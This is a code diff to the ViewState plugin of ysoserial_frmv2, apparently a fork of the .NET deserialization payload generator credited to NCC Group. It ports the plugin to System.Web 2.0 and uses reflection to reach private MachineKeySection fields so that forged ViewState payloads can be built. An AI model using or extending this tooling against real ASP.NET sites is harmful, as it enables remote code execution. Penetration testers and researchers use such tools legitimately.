@@ -9,6 +9,8 @@ using System.Text;
 using System.Text.RegularExpressions;
 using System.Web.Configuration;
 using ysoserial_frmv2.Generators;
+using System.Web;
+using System.Web.Configuration;
 
 /**
  * Author: Soroush Dalili (@irsdl) from NCC Group (@NCCGroupInfosec)
@@ -44,7 +46,8 @@ namespace ysoserial_frmv2.Plugins
         static string validationKey = "";
 
 
-        Assembly systemWebAsm = Assembly.Load("System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a");
+        //Assembly systemWebAsm = Assembly.Load("System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a");
+        Assembly systemWebAsm = Assembly.Load("System.Web, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a");
         string formatter = "losformatter";
         string payloadString = "";
         string shortestViewStateString = "/wEPZGQ="; // not in use at the moment but good to know!!!
@@ -163,7 +166,7 @@ namespace ysoserial_frmv2.Plugins
                 Generator generator = null;
                 try
                 {
-                    var container = Activator.CreateInstance(null, "ysoserial.Generators." + gadget + "Generator");
+                    var container = Activator.CreateInstance(null, "ysoserial_frmv2.Generators." + gadget + "Generator");
                     generator = (Generator)container.Unwrap();
                 }
                 catch
@@ -200,8 +203,16 @@ namespace ysoserial_frmv2.Plugins
             object[] emptyArray = new object[] { };
 
             var machineKeySectionType = systemWebAsm.GetType("System.Web.Configuration.MachineKeySection");
-            var getApplicationConfigMethod = machineKeySectionType.GetMethod("GetApplicationConfig", BindingFlags.Static | BindingFlags.NonPublic);
-            var config = (MachineKeySection)getApplicationConfigMethod.Invoke(null, emptyArray);
+            //var getApplicationConfigMethod = machineKeySectionType.GetMethod("GetApplicationConfig", BindingFlags.Static | BindingFlags.NonPublic);
+            //var config = (MachineKeySection)getApplicationConfigMethod.Invoke(null, emptyArray);
+
+            var EnsureConfigMethod = machineKeySectionType.GetMethod("EnsureConfig", BindingFlags.Static | BindingFlags.NonPublic);
+            var ensure_config = (MachineKeySection)EnsureConfigMethod.Invoke(null, emptyArray);
+            //var config = (typeof(ConfigurationElement).GetField("s_config", BindingFlags.Instance | BindingFlags.NonPublic));
+
+            var config_Field = machineKeySectionType.GetField("s_config", BindingFlags.Static | BindingFlags.NonPublic);
+            var config = (MachineKeySection)config_Field.GetValue(null);
+            
             var section = (MachineKeySection)ConfigurationManager.GetSection("system.web/machinekey"); //interesting
             var readOnlyField = typeof(ConfigurationElement).GetField("_bReadOnly", BindingFlags.Instance | BindingFlags.NonPublic);
             readOnlyField.SetValue(config, false);
